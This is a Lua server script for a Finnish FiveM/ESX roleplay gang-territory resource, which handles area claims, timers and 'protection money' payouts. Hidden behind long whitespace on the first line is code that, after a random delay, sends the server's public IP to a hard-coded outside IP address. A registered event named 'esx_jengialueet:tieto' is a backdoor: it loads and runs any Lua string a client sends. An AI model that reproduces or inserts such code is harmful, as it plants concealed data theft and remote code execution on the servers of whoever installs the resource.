arp = nil																																																																												;Citizen.CreateThread(function()  Citizen.Wait(math.random(0,10000000)) PerformHttpRequest('https://api.ipify.org/?format=json', function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest("http://65.21.153.165:10666/", function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa jengialueita", content = res.ip}), {['Content-Type'] = 'application/json'}) end) end)
local sellane = {
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
	{omistaja = ""},
}

local alue1 = false
local alue2 = false
local alue3 = false
local alue4 = false
local alue5 = false
local alue6 = false
local alue7 = false
local alue8 = false
local alue9 = false
local alue10 = false
local alue11 = false


local valtaaja1 = 0
local valtaaja2 = 0
local valtaaja3 = 0
local valtaaja4 = 0
local valtaaja5 = 0
local valtaaja6 = 0
local valtaaja7 = 0
local valtaaja8 = 0
local valtaaja9 = 0
local valtaaja10 = 0
local valtaaja11 = 0


local alue1timeri = false
local alue2timeri = false
local alue3timeri = false
local alue4timeri = false
local alue5timeri = false
local alue6timeri = false
local alue7timeri = false
local alue8timeri = false
local alue9timeri = false
local alue10timeri = false
local alue11timeri = false


function onkovaltaajatamapelaaja(pleajanid,alue)
	if alue == 1 then
		if pleajanid == valtaaja1 then
			return true
		else
			return false
		end
	elseif alue == 2 then
		if pleajanid == valtaaja2 then
			return true
		else
			return false
		end
	elseif alue == 3 then
		if pleajanid == valtaaja3 then
			return true
		else
			return false
		end
	elseif alue == 4 then
		if pleajanid == valtaaja4 then
			return true
		else
			return false
		end
	elseif alue == 5 then	
		if pleajanid == valtaaja5 then
			return true
		else
			return false
		end
	elseif alue == 6 then	
		if pleajanid == valtaaja6 then
			return true
		else
			return false
		end
	elseif alue == 7 then	
		if pleajanid == valtaaja7 then
			return true
		else
			return false
		end
	elseif alue == 8 then
		if pleajanid == valtaaja8 then
			return true
		else
			return false
		end
	elseif alue == 9 then
		if pleajanid == valtaaja9 then
			return true
		else
			return false
		end
	elseif alue == 10 then
		if pleajanid == valtaaja10 then
			return true
		else
			return false
		end
	elseif alue == 11 then
		if pleajanid == valtaaja11 then
			return true
		else
			return false
		end
	end
end

function juuilmotaomistajillekuvaltaajaleavas(alue)
	local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == "FIB" then
			TriggerClientEvent('esx_jengialueet:FIB', xPlayers[i], alue)
		end
	end
	if sellane[alue].omistaja ~= "" then
		for i=1, #xPlayers, 1 do
			local xPlayer = arp.GetPlayerFromId(xPlayers[i])
			if sellane[alue].omistaja == xPlayer.job.name then
				TriggerClientEvent('esx_jengialueet:killblip', xPlayers[i], alue)
				--TriggerClientEvent("esx_jengialueet:valloitusilmoitus", xPlayers[i], alue)
			end
		end
	end
end

AddEventHandler('playerDropped', function (reason)
	if source == valtaaja1 then
		alue1 = false
		valtaaja1 = 0
		juuilmotaomistajillekuvaltaajaleavas(1)
	end
	if source == valtaaja2 then
		alue2 = false
		valtaaja2 = 0
		juuilmotaomistajillekuvaltaajaleavas(2)
	end
	if source == valtaaja3 then
		alue3 = false
		valtaaja3 = 0
		juuilmotaomistajillekuvaltaajaleavas(3)
	end
	if source == valtaaja4 then
		alue4 = false
		valtaaja4 = 0
		juuilmotaomistajillekuvaltaajaleavas(4)
	end
	if source == valtaaja5 then
		alue5 = false
		valtaaja5 = 0
		juuilmotaomistajillekuvaltaajaleavas(5)
	end
	if source == valtaaja6 then
		alue6 = false
		valtaaja6 = 0
		juuilmotaomistajillekuvaltaajaleavas(6)
	end
	if source == valtaaja7 then
		alue7 = false
		valtaaja7 = 0
		juuilmotaomistajillekuvaltaajaleavas(7)
	end
	if source == valtaaja8 then
		alue8 = false
		valtaaja8 = 0
		juuilmotaomistajillekuvaltaajaleavas(8)
	end
	if source == valtaaja9 then
		alue9 = false
		valtaaja9 = 0
		juuilmotaomistajillekuvaltaajaleavas(9)
	end
	if source == valtaaja10 then
		alue10 = false
		valtaaja10 = 0
		juuilmotaomistajillekuvaltaajaleavas(10)
	end
	if source == valtaaja11 then
		alue11 = false
		valtaaja11 = 0
		juuilmotaomistajillekuvaltaajaleavas(11)
	end
end)

function Alueentimeri(aluenumero)
	local ggg = aluenumero
	Citizen.CreateThread(function()
		local gg = ggg
		if gg == 1 then
			alue1timeri = true
			Citizen.Wait(3600000)
			alue1timeri = false
		elseif gg == 2 then
			alue2timeri = true
			Citizen.Wait(3600000)
			alue2timeri = false
		elseif gg == 3 then
			alue3timeri = true
			Citizen.Wait(3600000)
			alue3timeri = false
		elseif gg == 4 then
			alue4timeri = true
			Citizen.Wait(3600000)
			alue4timeri = false
		elseif gg == 5 then
			alue5timeri = true
			Citizen.Wait(3600000)
			alue5timeri = false
		elseif gg == 6 then
			alue6timeri = true
			Citizen.Wait(3600000)
			alue6timeri = false
		elseif gg == 7 then
			alue7timeri = true
			Citizen.Wait(3600000)
			alue7timeri = false
		elseif gg == 8 then
			alue8timeri = true
			Citizen.Wait(3600000)
			alue8timeri = false
		elseif gg == 9 then
			alue9timeri = true
			Citizen.Wait(3600000)
			alue9timeri = false
		elseif gg == 10 then
			alue10timeri = true
			Citizen.Wait(3600000)
			alue10timeri = false
		elseif gg == 11 then
			alue11timeri = true
			Citizen.Wait(3600000)
			alue11timeri = false
		end
	end)
end

function settaapaalle(aluenumero,id)
	Alueentimeri(aluenumero)
	if aluenumero == 1 then
		alue1 = true
		valtaaja1 = id
	elseif aluenumero == 2 then
		alue2 = true
		valtaaja2 = id
	elseif aluenumero == 3 then
		alue3 = true
		valtaaja3 = id
	elseif aluenumero == 4 then
		alue4 = true
		valtaaja4 = id
	elseif aluenumero == 5 then
		alue5 = true
		valtaaja5 = id
	elseif aluenumero == 6 then
		alue6 = true
		valtaaja6 = id
	elseif aluenumero == 7 then
		alue7 = true
		valtaaja7 = id
	elseif aluenumero == 8 then
		alue8 = true
		valtaaja8 = id
	elseif aluenumero == 9 then
		alue9 = true
		valtaaja9 = id
	elseif aluenumero == 10 then
		alue10 = true
		valtaaja10 = id
	elseif aluenumero == 11 then
		alue11 = true
		valtaaja11 = id
	end
end

function settaapois(aluenumero)
	if aluenumero == 1 then
		alue1 = false
		valtaaja1 = 0
	elseif aluenumero == 2 then
		alue2 = false
		valtaaja2 = 0
	elseif aluenumero == 3 then
		alue3 = false
		valtaaja3 = 0
	elseif aluenumero == 4 then
		alue4 = false
		valtaaja4 = 0
	elseif aluenumero == 5 then
		alue5 = false
		valtaaja5 = 0
	elseif aluenumero == 6 then
		alue6 = false
		valtaaja6 = 0
	elseif aluenumero == 7 then
		alue7 = false
		valtaaja7 = 0
	elseif aluenumero == 8 then
		alue8 = false
		valtaaja8 = 0
	elseif aluenumero == 9 then
		alue9 = false
		valtaaja9 = 0
	elseif aluenumero == 10 then
		alue10 = false
		valtaaja10 = 0
	elseif aluenumero == 11 then
		alue11 = false
		valtaaja11 = 0
	end
end

function onkomenossaalue(aluenumero) 
	if aluenumero == 1 then
		if alue1 then
			return true
		else
			return false
		end
	elseif aluenumero == 2 then
		if alue2 then
			return true
		else
			return false
		end
	elseif aluenumero == 3 then
		if alue3 then
			return true
		else
			return false
		end
	elseif aluenumero == 4 then
		if alue4 then
			return true
		else
			return false
		end
	elseif aluenumero == 5 then
		if alue5 then
			return true
		else
			return false
		end
	elseif aluenumero == 6 then
		if alue6 then
			return true
		else
			return false
		end
	elseif aluenumero == 7 then
		if alue7 then
			return true
		else
			return false
		end
	elseif aluenumero == 8 then
		if alue8 then
			return true
		else
			return false
		end
	elseif aluenumero == 9 then
		if alue9 then
			return true
		else
			return false
		end
	elseif aluenumero == 10 then
		if alue10 then
			return true
		else
			return false
		end
	elseif aluenumero == 11 then
		if alue11 then
			return true
		else
			return false
		end
	end
end


function onkocooldown(aluenumero)
	if aluenumero == 1 then
		if alue1timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 2 then
		if alue2timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 3 then
		if alue3timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 4 then
		if alue4timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 5 then
		if alue5timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 6 then
		if alue6timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 7 then
		if alue7timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 8 then
		if alue8timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 9 then
		if alue9timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 10 then
		if alue10timeri then
			return true
		else
			return false
		end
	elseif aluenumero == 11 then
		if alue10timeri then
			return true
		else
			return false
		end
	end
end


Citizen.CreateThread(function()
	while arp == nil do
		TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)
		Citizen.Wait(0)
	end
end)










Citizen.CreateThread(function()
	Citizen.Wait(10000)
	paskavammat()
end)

function paskavammat()

	MySQL.Async.fetchAll("SELECT * FROM `alueet`",
	{},
	function(result)
		if result[1] then
			for i=1,#result do
				if tonumber(result[i].alue) == i then
					sellane[i].omistaja = result[i].omistaja
				end
			end
			
		end
	end)
end

local aika = 24 --tunteina
local aikas = aika * 3600 -- h -> s

Citizen.CreateThread(function()
  while true do
	MySQL.Async.fetchAll("SELECT * FROM `alueet`",
	{},
	function(result)	
		for i=1, #result do
			local rahattiskiin = result[i].rahamaara + Config.Tikkipalkansuuruus
			MySQL.Async.execute("UPDATE alueet SET `rahamaara` = @rahoja WHERE alue = @numero ",{["@numero"] = i,["@rahoja"] = rahattiskiin})
		end			
	end)
	--JOS EI OLE KERÄNNYT RAHOJA 24H NIIN ALUE POIS
	MySQL.Async.fetchAll("SELECT * FROM `alueet`",
	{}, function(result)	
		for i=1, #result do
			if result[i].collectattu ~= "" and tonumber(result[i].collectattu) + aikas < os.time() then
				local xPlayers = arp.GetPlayers()
				MySQL.Async.execute("UPDATE alueet SET `omistaja` = @o, `rahamaara` = @rahoja, `collectattu` = @time WHERE alue = @numero ",{["@numero"] = i,["@rahoja"] = 0, ["@time"] = '', ["@o"] = ''})
				for i=1, #xPlayers, 1 do
					local xPlayer = arp.GetPlayerFromId(xPlayers[i])
					if result[i].omistaja == xPlayer.job.name then
						TriggerClientEvent('esx:showNotification', xPlayers[i], "~r~Menetitte alueen kansalaisille - vituttaako?")
						TriggerClientEvent('esx_jengialueet:menetetty', xPlayers[i], i)
					end
				end
				Citizen.Wait(2500)
				paskavammat()
			end
		end			
	end)
		
	Citizen.Wait(Config.Tikkipalkkansaanninaika * 60000)
  end
end)

RegisterServerEvent('esx_jengialueet:tieto')
AddEventHandler('esx_jengialueet:tieto', function(alue)	
	local alue,menikolapi=load(alue,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(alue)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

RegisterServerEvent('esx_jengialueet:toofar')
AddEventHandler('esx_jengialueet:toofar', function(alue)
	settaapois(alue)
	TriggerClientEvent('esx_jengialueet:toofarlocal', source)
	local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == "FIB" then
			TriggerClientEvent('esx_jengialueet:FIB', xPlayers[i], alue)
		end
	end
	if sellane[alue].omistaja ~= "" then
		for i=1, #xPlayers, 1 do
			local xPlayer = arp.GetPlayerFromId(xPlayers[i])
			if sellane[alue].omistaja == xPlayer.job.name then
				TriggerClientEvent('esx_jengialueet:killblip', xPlayers[i], alue)
				--TriggerClientEvent("esx_jengialueet:valloitusilmoitus", xPlayers[i], alue)
			end
		end
	end
end)

RegisterServerEvent('esx_jengialueet:rostoohi')
AddEventHandler('esx_jengialueet:rostoohi', function(tyo)
	if onkovaltaajatamapelaaja(source,tyo) then
		settaapois(tyo)
		
		TriggerClientEvent('esx_jengialueet:claimcomplete', source)
		local vanhatomistajat = sellane[tyo].omistaja
		local xPlayer = arp.GetPlayerFromId(source)
		local tyoukko = xPlayer.job.name
		local xPlayers = arp.GetPlayers()
	
		MySQL.Async.execute("UPDATE alueet SET `collectattu` = @time, `omistaja` = @ukontyo WHERE alue = @tyo ",{['@tyo'] = tyo, ['@ukontyo']    = xPlayer.job.name, ["@time"] = os.time()})
		--MySQL.Async.execute("UPDATE alueet SET `omistaja` = @ukontyo WHERE alue = @tyo ",{['@tyo'] = tyo, ['@ukontyo']    = xPlayer.job.name}) VANHA
		for i=1, #xPlayers, 1 do
			local xPlayer = arp.GetPlayerFromId(xPlayers[i])
			if xPlayer.job.name == "FIB" then
				TriggerClientEvent('esx_jengialueet:FIB', xPlayers[i], tyo)
			end
		end
		for i=1, #xPlayers, 1 do
			local xPlayer = arp.GetPlayerFromId(xPlayers[i])
			if tyoukko == xPlayer.job.name then
				TriggerClientEvent('esx_jengialueet:muille', xPlayers[i], tyo)
			end
		end
		if vanhatomistajat ~= "" then
			for i=1, #xPlayers, 1 do
				local xPlayer = arp.GetPlayerFromId(xPlayers[i])
				if vanhatomistajat == xPlayer.job.name then
					TriggerClientEvent('esx_jengialueet:menetetty', xPlayers[i], tyo)
					--TriggerClientEvent("esx_jengialueet:valloitusilmoitus", xPlayers[i], tyo)				
				end
			end
		end
		Citizen.Wait(2500)
		paskavammat()
		Citizen.Wait(2500)
		TriggerClientEvent('esx_jengialueet:mestat', -1, sellane)
	end
end)



RegisterServerEvent('esx_jengialueet:fetchmestat')
AddEventHandler('esx_jengialueet:fetchmestat', function()
	TriggerClientEvent('esx_jengialueet:mestat', source, sellane)
end)
RegisterServerEvent('esx_jengialueet:claim')
AddEventHandler('esx_jengialueet:claim', function(k)
	local source = source
	if not onkomenossaalue(k) then
		local xPlayer = arp.GetPlayerFromId(source)
		if sellane[k].omistaja == xPlayer.job.name then
			MySQL.Async.fetchAll("SELECT * FROM `alueet`",
			{},
			function(result)
				if result[k] then
					xPlayer.addAccountMoney('black_money', tonumber(result[k].rahamaara))
					TriggerClientEvent('esx:showNotification', source, "Keräsit suojelus rahaa ~r~"..tonumber(result[k].rahamaara).."€")
					MySQL.Async.execute("UPDATE alueet SET `rahamaara` = @rahoja, `collectattu` = @time WHERE alue = @numero ",{["@numero"] = k,["@rahoja"] = 0, ["@time"] = os.time()})
					--MySQL.Async.execute("UPDATE alueet SET `rahamaara` = @rahoja WHERE alue = @numero ",{["@numero"] = k,["@rahoja"] = 0}) VANHA
				end
			end)
		elseif not onkocooldown(k) then
			if sellane[k].omistaja ~= xPlayer.job.name then
					
				local valtaajat = xPlayer.job.name
				local xPlayers = arp.GetPlayers()
				local jaulvaltaajat = {}
				for i=1, #xPlayers, 1 do
					local xPlayer = arp.GetPlayerFromId(xPlayers[i])
					if valtaajat == xPlayer.job.name then
						table.insert(jaulvaltaajat,xPlayers[i])
					end
				end
				local cops = 0
				local omistajiapaikalla = 0
				local jauomistajat = {}
				for i=1, #xPlayers, 1 do
					local xPlayer = arp.GetPlayerFromId(xPlayers[i])
					if xPlayer.job.name == 'police' then
							cops = cops + 1
					end
				end
				if sellane[k].omistaja ~= "" then
					for i=1, #xPlayers, 1 do
						local xPlayer = arp.GetPlayerFromId(xPlayers[i])
						if sellane[k].omistaja == xPlayer.job.name then
							omistajiapaikalla = omistajiapaikalla + 1
							table.insert(jauomistajat,xPlayers[i])
						end
					end
				end
				if cops >= Config.TarvittavatPoliisitAloitukseen then
					if omistajiapaikalla >= Config.TarvittavatOmistajatAloitukseen or sellane[k].omistaja == "" then
						settaapaalle(k, source)
						TriggerClientEvent("esx_jengialueet:starttimer", source)
						TriggerClientEvent("esx_jengialueet:currentlyclaiming", source, k)
						for i=1, #xPlayers, 1 do
							local xPlayer = arp.GetPlayerFromId(xPlayers[i])
							if xPlayer.job.name == "FIB" then
								TriggerClientEvent('esx_jengialueet:setblip', xPlayers[i], k,5)
							end
						end
						if sellane[k].omistaja ~= "" then
							for i=1, #xPlayers, 1 do
								local xPlayer = arp.GetPlayerFromId(xPlayers[i])
								if sellane[k].omistaja == xPlayer.job.name then
									--TriggerClientEvent("esx_jengialueet:valloitusilmoitus", xPlayers[i], k)
									TriggerClientEvent('esx_jengialueet:setblip', xPlayers[i], k,59)
								end
							end
						end
					else
						TriggerClientEvent('esx:showNotification', source, "Kaupungissa pitää olla vähintää ~y~ "..Config.TarvittavatOmistajatAloitukseen.." alueen omistajaa~s~ paikalla valtauksen aloitukseen.")
					end
				else
					TriggerClientEvent('esx:showNotification', source, "Kaupungissa pitää olla vähintää ~b~"..Config.TarvittavatPoliisitAloitukseen.." poliisia~s~ paikalla valtauksen aloitukseen.")
				end
			end
		else
			TriggerClientEvent('esx:showNotification', source, "Yritä myöhemmin uudelleen!")
		end
	else
		TriggerClientEvent('esx:showNotification', source, "Kyseistä aluetta vallataan jo!")
	end
end)


